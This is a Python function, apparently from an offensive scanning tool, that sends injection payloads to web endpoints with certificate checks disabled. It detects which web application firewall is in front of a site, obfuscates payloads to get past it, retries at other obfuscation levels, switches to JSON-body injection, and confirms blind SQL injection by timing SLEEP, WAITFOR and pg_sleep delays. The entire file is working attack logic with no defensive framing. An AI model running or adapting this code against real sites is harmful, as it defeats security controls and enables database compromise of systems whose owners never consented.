def smart_request(session, url, data=None, json_data=None, param_name=None, payload=None, verbose=False):
    """
    Smart request handler with:
    1. WAF detection from headers
    2. Adaptive obfuscation based on WAF type
    3. Time-based payload verification
    """
    if not SMART_MODULES_AVAILABLE:
        if json_data:
            return session.post(url, json=json_data, timeout=10, verify=False)
        return session.post(url, data=data, timeout=10, verify=False)
    
    # STEP 1: Detect WAF from headers (if AlZillObfuscator available)
    detected_waf = None
    if AlZillObfuscator:
        try:
            # Send a benign request first to detect WAF
            test_resp = session.get(url, timeout=5, verify=False)
            detected_waf = AlZillObfuscator.detect_waf_from_headers(test_resp.headers)
            if detected_waf and verbose:
                cprint(f"[*] Detected WAF: {detected_waf}", "yellow")
        except:
            pass
    
    # STEP 2: Send the actual request
    if json_data:
        response = session.post(url, json=json_data, timeout=10, verify=False)
    else:
        response = session.post(url, data=data, timeout=10, verify=False)
    
    # STEP 3: Analyze response
    action = SmartResponseAnalyzer.analyze(response)
    
    # STEP 4: Handle WAF detection (OBFUSCATE)
    if action == "OBFUSCATE" and payload:
        if verbose:
            cprint(f"[*] WAF detected! Retrying with obfuscated payload...", "yellow")
        
        # Apply obfuscation with WAF-specific techniques
        if AlZillObfuscator:
            if detected_waf:
                new_payload = AlZillObfuscator.super_obfuscate(payload, waf_type=detected_waf)
            else:
                new_payload = AlZillObfuscator.super_obfuscate(payload)
        else:
            new_payload = payload
        
        # Send obfuscated request
        if json_data:
            new_json = JSONInjector.inject(json_data, param_name, new_payload) if json_data else {param_name: new_payload}
            response = session.post(url, json=new_json, timeout=10, verify=False)
        else:
            new_data = {param_name: new_payload} if data else {param_name: new_payload}
            response = session.post(url, data=new_data, timeout=10, verify=False)
        
        # STEP 5: Verify time-based payloads (SLEEP, WAITFOR)
        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload.lower():
            elapsed = response.elapsed.total_seconds()
            if verbose:
                cprint(f"[*] Time-based payload response time: {elapsed:.2f}s", "blue")
            
            # Extract expected delay from payload
            expected_delay = 0
            delay_match = re.search(r'SLEEP\((\d+)\)|WAITFOR DELAY \'00:00:(\d+)\'|pg_sleep\((\d+)\)', payload, re.IGNORECASE)
            if delay_match:
                expected_delay = int(delay_match.group(1) or delay_match.group(2) or delay_match.group(3) or 0)
            
            if expected_delay > 0 and elapsed >= expected_delay * 0.8:
                if verbose:
                    cprint(f"[+] Time-based injection confirmed! Delay: {elapsed:.2f}s (expected {expected_delay}s)", "green")
        
        # Check if obfuscation succeeded
        if SmartResponseAnalyzer.is_success(response):
            if verbose:
                cprint(f"[+] Obfuscation successful!", "green")
            return response
        
        # STEP 6: Second attempt with medium obfuscation
        if AlZillObfuscator and verbose:
            cprint(f"[*] Second attempt with medium obfuscation...", "yellow")
            new_payload = AlZillObfuscator.medium_obfuscate(payload)
            if json_data:
                new_json = JSONInjector.inject(json_data, param_name, new_payload)
                response = session.post(url, json=new_json, timeout=10, verify=False)
            else:
                new_data = {param_name: new_payload}
                response = session.post(url, data=new_data, timeout=10, verify=False)
    
    # STEP 7: Handle JSON injection
    elif action == "USE_JSON" and payload:
        if verbose:
            cprint(f"[*] Switching to JSON injection...", "yellow")
        
        json_data = JSONInjector.inject({}, param_name, payload)
        response = session.post(url, json=json_data, timeout=10, verify=False)
    
    return response


